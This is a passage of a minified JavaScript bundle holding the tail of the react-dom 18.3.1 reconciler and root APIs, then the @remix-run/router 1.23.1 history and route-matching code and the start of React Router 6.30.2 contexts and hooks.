0:n=Va(null,n,s,e,t);break e;case 1:n=vc(null,n,s,e,t);break e;case 11:n=gc(null,n,s,e,t);break e;case 14:n=yc(null,n,s,$e(s.type,e),t);break e}throw Error(C(306,s,""))}return n;case 0:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:$e(s,r),Va(e,n,s,r,t);case 1:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:$e(s,r),vc(e,n,s,r,t);case 3:e:{if(ed(n),e===null)throw Error(C(387));s=n.pendingProps,i=n.memoizedState,r=i.element,Cp(e,n),Kr(n,s,null,t);var a=n.memoizedState;if(s=a.element,i.isDehydrated)if(i={element:s,isDehydrated:!1,cache:a.cache,pendingSuspenseBoundaries:a.pendingSuspenseBoundaries,transitions:a.transitions},n.updateQueue.baseState=i,n.memoizedState=i,n.flags&256){r=Ut(Error(C(423)),n),n=wc(e,n,s,t,r);break e}else if(s!==r){r=Ut(Error(C(424)),n),n=wc(e,n,s,t,r);break e}else for(Re=zn(n.stateNode.containerInfo.firstChild),Oe=n,Y=!0,Ye=null,t=Ep(n,null,s,t),n.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(jt(),s===r){n=wn(e,n,t);break e}we(e,n,s,t)}n=n.child}return n;case 5:return Ap(n),e===null&&ja(n),s=n.type,r=n.pendingProps,i=e!==null?e.memoizedProps:null,a=r.children,Oa(s,r)?a=null:i!==null&&Oa(s,i)&&(n.flags|=32),Jp(e,n),we(e,n,a,t),n.child;case 6:return e===null&&ja(n),null;case 13:return nd(e,n,t);case 4:return Hl(n,n.stateNode.containerInfo),s=n.pendingProps,e===null?n.child=Bt(n,null,s,t):we(e,n,s,t),n.child;case 11:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:$e(s,r),gc(e,n,s,r,t);case 7:return we(e,n,n.pendingProps,t),n.child;case 8:return we(e,n,n.pendingProps.children,t),n.child;case 12:return we(e,n,n.pendingProps.children,t),n.child;case 10:e:{if(s=n.type._context,r=n.pendingProps,i=n.memoizedProps,a=r.value,V(qr,s._currentValue),s._currentValue=a,i!==null)if(Qe(i.value,a)){if(i.children===r.children&&!Ae.current){n=wn(e,n,t);break e}}else for(i=n.child,i!==null&&(i.return=n);i!==null;){var l=i.dependencies;if(l!==null){a=i.child;for(var o=l.firstContext;o!==null;){if(o.context===s){if(i.tag===1){o=mn(-1,t&-t),o.tag=2;var c=i.updateQueue;if(c!==null){c=c.shared;var u=c.pending;u===null?o.next=o:(o.next=u.next,u.next=o),c.pending=o}}i.lanes|=t,o=i.alternate,o!==null&&(o.lanes|=t),Ba(i.return,t,n),l.lanes|=t;break}o=o.next}}else if(i.tag===10)a=i.type===n.type?null:i.child;else if(i.tag===18){if(a=i.return,a===null)throw Error(C(341));a.lanes|=t,l=a.alternate,l!==null&&(l.lanes|=t),Ba(a,t,n),a=i.sibling}else a=i.child;if(a!==null)a.return=i;else for(a=i;a!==null;){if(a===n){a=null;break}if(i=a.sibling,i!==null){i.return=a.return,a=i;break}a=a.return}i=a}we(e,n,r.children,t),n=n.child}return n;case 9:return r=n.type,s=n.pendingProps.children,Rt(n,t),r=He(r),s=s(r),n.flags|=1,we(e,n,s,t),n.child;case 14:return s=n.type,r=$e(s,n.pendingProps),r=$e(s.type,r),yc(e,n,s,r,t);case 15:return Qp(e,n,n.type,n.pendingProps,t);case 17:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:$e(s,r),Cr(e,n),n.tag=1,Pe(s)?(e=!0,$r(n)):e=!1,Rt(n,t),qp(n,s,r),Ua(n,s,r,t),Wa(null,n,s,!0,e,t);case 19:return td(e,n,t);case 22:return Zp(e,n,t)}throw Error(C(156,n.tag))};function vd(e,n){return $u(e,n)}function Am(e,n,t,s){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=s,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Fe(e,n,t,s){return new Am(e,n,t,s)}function so(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Pm(e){if(typeof e=="function")return so(e)?1:0;if(e!=null){if(e=e.$$typeof,e===xl)return 11;if(e===_l)return 14}return 2}function Fn(e,n){var t=e.alternate;return t===null?(t=Fe(e.tag,n,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=n,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&14680064,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,n=e.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t}function Nr(e,n,t,s,r,i){var a=2;if(s=e,typeof e=="function")so(e)&&(a=1);else if(typeof e=="string")a=5;else e:switch(e){case gt:return tt(t.children,r,i,n);case bl:a=8,r|=8;break;case pa:return e=Fe(12,t,n,r|2),e.elementType=pa,e.lanes=i,e;case da:return e=Fe(13,t,n,r),e.elementType=da,e.lanes=i,e;case ha:return e=Fe(19,t,n,r),e.elementType=ha,e.lanes=i,e;case Au:return _i(t,r,i,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case Tu:a=10;break e;case Cu:a=9;break e;case xl:a=11;break e;case _l:a=14;break e;case Sn:a=16,s=null;break e}throw Error(C(130,e==null?e:typeof e,""))}return n=Fe(a,t,n,r),n.elementType=e,n.type=s,n.lanes=i,n}function tt(e,n,t,s){return e=Fe(7,e,s,n),e.lanes=t,e}function _i(e,n,t,s){return e=Fe(22,e,s,n),e.elementType=Au,e.lanes=t,e.stateNode={isHidden:!1},e}function ra(e,n,t){return e=Fe(6,e,null,n),e.lanes=t,e}function ia(e,n,t){return n=Fe(4,e.children!==null?e.children:[],e.key,n),n.lanes=t,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function Nm(e,n,t,s,r){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Bi(0),this.expirationTimes=Bi(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Bi(0),this.identifierPrefix=s,this.onRecoverableError=r,this.mutableSourceEagerHydrationData=null}function ro(e,n,t,s,r,i,a,l,o){return e=new Nm(e,n,t,l,o),n===1?(n=1,i===!0&&(n|=8)):n=0,i=Fe(3,null,null,n),e.current=i,i.stateNode=e,i.memoizedState={element:s,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},Ul(i),e}function Lm(e,n,t){var s=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:mt,key:s==null?null:""+s,children:e,containerInfo:n,implementation:t}}function wd(e){if(!e)return Vn;e=e._reactInternals;e:{if(dt(e)!==e||e.tag!==1)throw Error(C(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(Pe(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(C(171))}if(e.tag===1){var t=e.type;if(Pe(t))return wp(e,t,n)}return n}function kd(e,n,t,s,r,i,a,l,o){return e=ro(t,s,!0,e,r,i,a,l,o),e.context=wd(null),t=e.current,s=be(),r=Bn(t),i=mn(s,r),i.callback=n??null,Dn(t,i,r),e.current.lanes=r,Ws(e,r,s),Ne(e,s),e}function Si(e,n,t,s){var r=n.current,i=be(),a=Bn(r);return t=wd(t),n.context===null?n.context=t:n.pendingContext=t,n=mn(i,a),n.payload={element:e},s=s===void 0?null:s,s!==null&&(n.callback=s),e=Dn(r,n,a),e!==null&&(Ke(e,r,a,i),Sr(e,r,a)),a}function ri(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Pc(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<n?t:n}}function io(e,n){Pc(e,n),(e=e.alternate)&&Pc(e,n)}function Rm(){return null}var bd=typeof reportError=="function"?reportError:function(e){console.error(e)};function ao(e){this._internalRoot=e}Ei.prototype.render=ao.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(C(409));Si(e,n,null,null)};Ei.prototype.unmount=ao.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;ct(function(){Si(null,e,null,null)}),n[yn]=null}};function Ei(e){this._internalRoot=e}Ei.prototype.unstable_scheduleHydration=function(e){if(e){var n=Zu();e={blockedOn:null,target:e,priority:n};for(var t=0;t<Cn.length&&n!==0&&n<Cn[t].priority;t++);Cn.splice(t,0,e),t===0&&ep(e)}};function lo(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Ti(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function Nc(){}function Om(e,n,t,s,r){if(r){if(typeof s=="function"){var i=s;s=function(){var c=ri(a);i.call(c)}}var a=kd(n,s,e,0,null,!1,!1,"",Nc);return e._reactRootContainer=a,e[yn]=a.current,As(e.nodeType===8?e.parentNode:e),ct(),a}for(;r=e.lastChild;)e.removeChild(r);if(typeof s=="function"){var l=s;s=function(){var c=ri(o);l.call(c)}}var o=ro(e,0,!1,null,null,!1,!1,"",Nc);return e._reactRootContainer=o,e[yn]=o.current,As(e.nodeType===8?e.parentNode:e),ct(function(){Si(n,o,t,s)}),o}function Ci(e,n,t,s,r){var i=t._reactRootContainer;if(i){var a=i;if(typeof r=="function"){var l=r;r=function(){var o=ri(a);l.call(o)}}Si(n,a,e,r)}else a=Om(t,n,e,r,s);return ri(a)}Ku=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var t=ls(n.pendingLanes);t!==0&&(Tl(n,t|1),Ne(n,J()),!(U&6)&&(Ht=J()+500,Gn()))}break;case 13:ct(function(){var s=vn(e,1);if(s!==null){var r=be();Ke(s,e,1,r)}}),io(e,1)}};Cl=function(e){if(e.tag===13){var n=vn(e,134217728);if(n!==null){var t=be();Ke(n,e,134217728,t)}io(e,134217728)}};Qu=function(e){if(e.tag===13){var n=Bn(e),t=vn(e,n);if(t!==null){var s=be();Ke(t,e,n,s)}io(e,n)}};Zu=function(){return H};Ju=function(e,n){var t=H;try{return H=e,n()}finally{H=t}};_a=function(e,n,t){switch(n){case"input":if(ga(e,t),n=t.name,t.type==="radio"&&n!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<t.length;n++){var s=t[n];if(s!==e&&s.form===e.form){var r=yi(s);if(!r)throw Error(C(90));Nu(s),ga(s,r)}}}break;case"textarea":Ru(e,t);break;case"select":n=t.value,n!=null&&At(e,!!t.multiple,n,!1)}};Bu=eo;Fu=ct;var Mm={usingClientEntryPoint:!1,Events:[Gs,kt,yi,Du,ju,eo]},ts={findFiberByHostInstance:Qn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Im={bundleType:ts.bundleType,version:ts.version,rendererPackageName:ts.rendererPackageName,rendererConfig:ts.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:bn.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=Vu(e),e===null?null:e.stateNode},findFiberByHostInstance:ts.findFiberByHostInstance||Rm,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var fr=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!fr.isDisabled&&fr.supportsFiber)try{hi=fr.inject(Im),tn=fr}catch{}}ze.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Mm;ze.createPortal=function(e,n){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!lo(n))throw Error(C(200));return Lm(e,n,null,t)};ze.createRoot=function(e,n){if(!lo(e))throw Error(C(299));var t=!1,s="",r=bd;return n!=null&&(n.unstable_strictMode===!0&&(t=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(r=n.onRecoverableError)),n=ro(e,1,!1,null,null,t,!1,s,r),e[yn]=n.current,As(e.nodeType===8?e.parentNode:e),new ao(n)};ze.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(C(188)):(e=Object.keys(e).join(","),Error(C(268,e)));return e=Vu(n),e=e===null?null:e.stateNode,e};ze.flushSync=function(e){return ct(e)};ze.hydrate=function(e,n,t){if(!Ti(n))throw Error(C(200));return Ci(null,e,n,!0,t)};ze.hydrateRoot=function(e,n,t){if(!lo(e))throw Error(C(405));var s=t!=null&&t.hydratedSources||null,r=!1,i="",a=bd;if(t!=null&&(t.unstable_strictMode===!0&&(r=!0),t.identifierPrefix!==void 0&&(i=t.identifierPrefix),t.onRecoverableError!==void 0&&(a=t.onRecoverableError)),n=kd(n,null,e,1,t??null,r,!1,i,a),e[yn]=n.current,As(e),s)for(e=0;e<s.length;e++)t=s[e],r=t._getVersion,r=r(t._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[t,r]:n.mutableSourceEagerHydrationData.push(t,r);return new Ei(n)};ze.render=function(e,n,t){if(!Ti(n))throw Error(C(200));return Ci(null,e,n,!1,t)};ze.unmountComponentAtNode=function(e){if(!Ti(e))throw Error(C(40));return e._reactRootContainer?(ct(function(){Ci(null,null,e,!1,function(){e._reactRootContainer=null,e[yn]=null})}),!0):!1};ze.unstable_batchedUpdates=eo;ze.unstable_renderSubtreeIntoContainer=function(e,n,t,s){if(!Ti(t))throw Error(C(200));if(e==null||e._reactInternals===void 0)throw Error(C(38));return Ci(e,n,t,!1,s)};ze.version="18.3.1-next-f1338f8080-20240426";function xd(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(xd)}catch(e){console.error(e)}}xd(),xu.exports=ze;var zm=xu.exports,_d,Lc=zm;_d=Lc.createRoot,Lc.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ds(){return Ds=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},Ds.apply(this,arguments)}var Ln;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(Ln||(Ln={}));const Rc="popstate";function Dm(e){e===void 0&&(e={});function n(s,r){let{pathname:i,search:a,hash:l}=s.location;return tl("",{pathname:i,search:a,hash:l},r.state&&r.state.usr||null,r.state&&r.state.key||"default")}function t(s,r){return typeof r=="string"?r:ii(r)}return Bm(n,t,null,e)}function ne(e,n){if(e===!1||e===null||typeof e>"u")throw new Error(n)}function oo(e,n){if(!e){typeof console<"u"&&console.warn(n);try{throw new Error(n)}catch{}}}function jm(){return Math.random().toString(36).substr(2,8)}function Oc(e,n){return{usr:e.state,key:e.key,idx:n}}function tl(e,n,t,s){return t===void 0&&(t=null),Ds({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof n=="string"?qt(n):n,{state:t,key:n&&n.key||s||jm()})}function ii(e){let{pathname:n="/",search:t="",hash:s=""}=e;return t&&t!=="?"&&(n+=t.charAt(0)==="?"?t:"?"+t),s&&s!=="#"&&(n+=s.charAt(0)==="#"?s:"#"+s),n}function qt(e){let n={};if(e){let t=e.indexOf("#");t>=0&&(n.hash=e.substr(t),e=e.substr(0,t));let s=e.indexOf("?");s>=0&&(n.search=e.substr(s),e=e.substr(0,s)),e&&(n.pathname=e)}return n}function Bm(e,n,t,s){s===void 0&&(s={});let{window:r=document.defaultView,v5Compat:i=!1}=s,a=r.history,l=Ln.Pop,o=null,c=u();c==null&&(c=0,a.replaceState(Ds({},a.state,{idx:c}),""));function u(){return(a.state||{idx:null}).idx}function h(){l=Ln.Pop;let w=u(),d=w==null?null:w-c;c=w,o&&o({action:l,location:y.location,delta:d})}function f(w,d){l=Ln.Push;let p=tl(y.location,w,d);c=u()+1;let m=Oc(p,c),v=y.createHref(p);try{a.pushState(m,"",v)}catch(x){if(x instanceof DOMException&&x.name==="DataCloneError")throw x;r.location.assign(v)}i&&o&&o({action:l,location:y.location,delta:1})}function g(w,d){l=Ln.Replace;let p=tl(y.location,w,d);c=u();let m=Oc(p,c),v=y.createHref(p);a.replaceState(m,"",v),i&&o&&o({action:l,location:y.location,delta:0})}function k(w){let d=r.location.origin!=="null"?r.location.origin:r.location.href,p=typeof w=="string"?w:ii(w);return p=p.replace(/ $/,"%20"),ne(d,"No window.location.(origin|href) available to create URL for href: "+p),new URL(p,d)}let y={get action(){return l},get location(){return e(r,a)},listen(w){if(o)throw new Error("A history only accepts one active listener");return r.addEventListener(Rc,h),o=w,()=>{r.removeEventListener(Rc,h),o=null}},createHref(w){return n(r,w)},createURL:k,encodeLocation(w){let d=k(w);return{pathname:d.pathname,search:d.search,hash:d.hash}},push:f,replace:g,go(w){return a.go(w)}};return y}var Mc;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(Mc||(Mc={}));function Fm(e,n,t){return t===void 0&&(t="/"),Um(e,n,t)}function Um(e,n,t,s){let r=typeof n=="string"?qt(n):n,i=co(r.pathname||"/",t);if(i==null)return null;let a=Sd(e);Hm(a);let l=null;for(let o=0;l==null&&o<a.length;++o){let c=eg(i);l=Qm(a[o],c)}return l}function Sd(e,n,t,s){n===void 0&&(n=[]),t===void 0&&(t=[]),s===void 0&&(s="");let r=(i,a,l)=>{let o={relativePath:l===void 0?i.path||"":l,caseSensitive:i.caseSensitive===!0,childrenIndex:a,route:i};o.relativePath.startsWith("/")&&(ne(o.relativePath.startsWith(s),'Absolute route path "'+o.relativePath+'" nested under path '+('"'+s+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),o.relativePath=o.relativePath.slice(s.length));let c=Un([s,o.relativePath]),u=t.concat(o);i.children&&i.children.length>0&&(ne(i.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+c+'".')),Sd(i.children,n,u,c)),!(i.path==null&&!i.index)&&n.push({path:c,score:Xm(c,i.index),routesMeta:u})};return e.forEach((i,a)=>{var l;if(i.path===""||!((l=i.path)!=null&&l.includes("?")))r(i,a);else for(let o of Ed(i.path))r(i,a,o)}),n}function Ed(e){let n=e.split("/");if(n.length===0)return[];let[t,...s]=n,r=t.endsWith("?"),i=t.replace(/\?$/,"");if(s.length===0)return r?[i,""]:[i];let a=Ed(s.join("/")),l=[];return l.push(...a.map(o=>o===""?i:[i,o].join("/"))),r&&l.push(...a),l.map(o=>e.startsWith("/")&&o===""?"/":o)}function Hm(e){e.sort((n,t)=>n.score!==t.score?t.score-n.score:Km(n.routesMeta.map(s=>s.childrenIndex),t.routesMeta.map(s=>s.childrenIndex)))}const Vm=/^:[\w-]+$/,Wm=3,$m=2,Gm=1,Ym=10,qm=-2,Ic=e=>e==="*";function Xm(e,n){let t=e.split("/"),s=t.length;return t.some(Ic)&&(s+=qm),n&&(s+=$m),t.filter(r=>!Ic(r)).reduce((r,i)=>r+(Vm.test(i)?Wm:i===""?Gm:Ym),s)}function Km(e,n){return e.length===n.length&&e.slice(0,-1).every((s,r)=>s===n[r])?e[e.length-1]-n[n.length-1]:0}function Qm(e,n,t){let{routesMeta:s}=e,r={},i="/",a=[];for(let l=0;l<s.length;++l){let o=s[l],c=l===s.length-1,u=i==="/"?n:n.slice(i.length)||"/",h=Zm({path:o.relativePath,caseSensitive:o.caseSensitive,end:c},u),f=o.route;if(!h)return null;Object.assign(r,h.params),a.push({params:r,pathname:Un([i,h.pathname]),pathnameBase:ig(Un([i,h.pathnameBase])),route:f}),h.pathnameBase!=="/"&&(i=Un([i,h.pathnameBase]))}return a}function Zm(e,n){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[t,s]=Jm(e.path,e.caseSensitive,e.end),r=n.match(t);if(!r)return null;let i=r[0],a=i.replace(/(.)\/+$/,"$1"),l=r.slice(1);return{params:s.reduce((c,u,h)=>{let{paramName:f,isOptional:g}=u;if(f==="*"){let y=l[h]||"";a=i.slice(0,i.length-y.length).replace(/(.)\/+$/,"$1")}const k=l[h];return g&&!k?c[f]=void 0:c[f]=(k||"").replace(/%2F/g,"/"),c},{}),pathname:i,pathnameBase:a,pattern:e}}function Jm(e,n,t){n===void 0&&(n=!1),t===void 0&&(t=!0),oo(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let s=[],r="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(a,l,o)=>(s.push({paramName:l,isOptional:o!=null}),o?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(s.push({paramName:"*"}),r+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?r+="\\/*$":e!==""&&e!=="/"&&(r+="(?:(?=\\/|$))"),[new RegExp(r,n?void 0:"i"),s]}function eg(e){try{return e.split("/").map(n=>decodeURIComponent(n).replace(/\//g,"%2F")).join("/")}catch(n){return oo(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+n+").")),e}}function co(e,n){if(n==="/")return e;if(!e.toLowerCase().startsWith(n.toLowerCase()))return null;let t=n.endsWith("/")?n.length-1:n.length,s=e.charAt(t);return s&&s!=="/"?null:e.slice(t)||"/"}const ng=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,tg=e=>ng.test(e);function sg(e,n){n===void 0&&(n="/");let{pathname:t,search:s="",hash:r=""}=typeof e=="string"?qt(e):e,i;if(t)if(tg(t))i=t;else{if(t.includes("//")){let a=t;t=t.replace(/\/\/+/g,"/"),oo(!1,"Pathnames cannot have embedded double slashes - normalizing "+(a+" -> "+t))}t.startsWith("/")?i=zc(t.substring(1),"/"):i=zc(t,n)}else i=n;return{pathname:i,search:ag(s),hash:lg(r)}}function zc(e,n){let t=n.replace(/\/+$/,"").split("/");return e.split("/").forEach(r=>{r===".."?t.length>1&&t.pop():r!=="."&&t.push(r)}),t.length>1?t.join("/"):"/"}function aa(e,n,t,s){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+n+"` field ["+JSON.stringify(s)+"].  Please separate it out to the ")+("`to."+t+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function rg(e){return e.filter((n,t)=>t===0||n.route.path&&n.route.path.length>0)}function Td(e,n){let t=rg(e);return n?t.map((s,r)=>r===t.length-1?s.pathname:s.pathnameBase):t.map(s=>s.pathnameBase)}function Cd(e,n,t,s){s===void 0&&(s=!1);let r;typeof e=="string"?r=qt(e):(r=Ds({},e),ne(!r.pathname||!r.pathname.includes("?"),aa("?","pathname","search",r)),ne(!r.pathname||!r.pathname.includes("#"),aa("#","pathname","hash",r)),ne(!r.search||!r.search.includes("#"),aa("#","search","hash",r)));let i=e===""||r.pathname==="",a=i?"/":r.pathname,l;if(a==null)l=t;else{let h=n.length-1;if(!s&&a.startsWith("..")){let f=a.split("/");for(;f[0]==="..";)f.shift(),h-=1;r.pathname=f.join("/")}l=h>=0?n[h]:"/"}let o=sg(r,l),c=a&&a!=="/"&&a.endsWith("/"),u=(i||a===".")&&t.endsWith("/");return!o.pathname.endsWith("/")&&(c||u)&&(o.pathname+="/"),o}const Un=e=>e.join("/").replace(/\/\/+/g,"/"),ig=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),ag=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,lg=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function og(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const Ad=["post","put","patch","delete"];new Set(Ad);const cg=["get",...Ad];new Set(cg);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function js(){return js=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},js.apply(this,arguments)}const uo=E.createContext(null),ug=E.createContext(null),ht=E.createContext(null),Ai=E.createContext(null),Yn=E.createContext({outlet:null,matches:[],isDataRoute:!1}),Pd=E.createContext(null);function pg(e,n){let{relative:t}=n===void 0?{}:n;qs()||ne(!1);let{basename:s,navigator:r}=E.useContext(ht),{hash:i,pathname:a,search:l}=Rd(e,{relative:t}),o=a;return s!=="/"&&(o=a==="/"?s:Un([s,a])),r.createHref({pathname:o,search:l,hash:i})}function qs(){return E.useContext(Ai)!=null}function Xs(){return qs()||ne(!1),E.useContext(Ai).location}function Nd(e){E.useContext(ht).static||E.useLayoutEffect(e)}function Ld(){let{isDataRoute:e}=E.useContext(Yn);return e?Eg():dg()}function dg(){qs()||ne(!1);let e=E.useContext(uo),{basename:n,future:t,navigator:s}=E.useContext(ht),{matches:r}=E.useContext(Yn),{pathname:i}=Xs(),a=JSON.stringify(Td(r,t.v7_relativeSplatPath)),l=E.useRef(!1);return Nd(()=>{l.current=!0}),E.useCallback(function(c,u){if(u===void 0&&(u={}),!l.current)return;if(typeof c=="number"){s.go(c);return}let h=Cd(c,JSON.parse(a),i,u.relative==="path");e==null&&n!=="/"&&(h.pathname=h.pathname==="/"?n:Un([n,h.pathname])),(u.replace?s.replace:s.push)(h,u.state,u)},[n,s,a,i,e])}function hg(){let{matches:e}=E.useContext(Yn),n=e[e.length-1];return n?n.params:{}}function Rd(e,n){let{relative:t}=n===void 0?{}:n,{future:s}=E.useContext(ht),{matches:r}=E.useContext(Yn),{pathname:i}=Xs(),a=JSON.stringify(Td(r,s.v7_relativeSplatPath));return E.useMemo(()=>Cd(e,JSON.parse(a),i,t==="path"),[e,a,i,t])}function fg(e,n){return mg(e,n)}function mg(e,n,t,s){qs()||ne(!1);let{navigator:r}=E.useContext(ht),{matches:i}=E.useContext(Yn),a=i[i.length-1],l=a?a.params:{};a&&a.pathname;let o=a?a.pathnameBase:"/";a&&a.route;let c=Xs(),u;if(n){var h;let w=typeof n=="string"?qt(n):n;o==="/"||(h=w.pathname)!=null&&h.startsWith(o)||ne(!1),u=w}else u=c;let f=u.pathname||"/",g=f;if(o!=="/"){let w=o.replace(/^\//,"").split("/");g="/"+f.replace(/^\//,"").split("/").slice(w.length).join("/")}let k=Fm(e,{pathname:g}),y=kg(k&&k.map(w=>Object.assign({},w,{params:Object.assign({},l,w.params),pathname:Un([o,r.encodeLocation?r.encodeLocation(w.pathname).pathname:w.pathname]),pathnameBase:w.pathnameBase==="/"?o:Un([o,r.encodeLocation?r.encodeLocation(w.pathnameBase).pathname:w.pathnameBase])})),i,t,s);return n&&y?E.createElement(Ai.Provider,{value:{location:js({pathname:"/",search:"",hash:"",state:null,key:"default"},u),navigationType:Ln.Pop}},y):y}function gg(){let e=Sg(),n=og(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),t=e instanceof Error?e.stack:null,r={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return E.createElement(E.Fragment,null,E.createElement("h2",null,"Unexpected Application Error!"),E.createElement("h3",{style:{fontStyle:"italic"}},n),t?E.createElement("pre",{style:r},t):null,null)}const yg=E.createElement(gg,null);class vg extends E.Component{constructor(n){super(n),this.state={location:n.location,revalidation:n.revalidation,error:n.error}}static getDerivedStateFromError(n){return{error:n}}static getDerivedStateFromProps(n,t){return t.location!==n.location||t.revalidation!=="idle"&&n.revalidation==="idle"?{error:n.error,location:n.location,revalidation:n.revalidation}:{error:n.error!==void 0?n.error:t.error,location:t.location,revalidation:n.revalidation||t.revalidation}}componentDidCatch(n,t){console.error("React Router caught the following error during render",n,t)}render(){return this.state.error!==void 0?E.createElement(Yn.Provider,{value:this.props.routeContext},E.createElement(Pd.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function wg(e){let{routeContext:n,match:t,children:s}=e,r=E.useContext(uo);return r&&r.static&&r.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=t.route.id),E.createElement(Yn.Provider,{value:n},s)}function kg(e,n,t,s){var r;if(n===void 0&&(n=[]),t===void 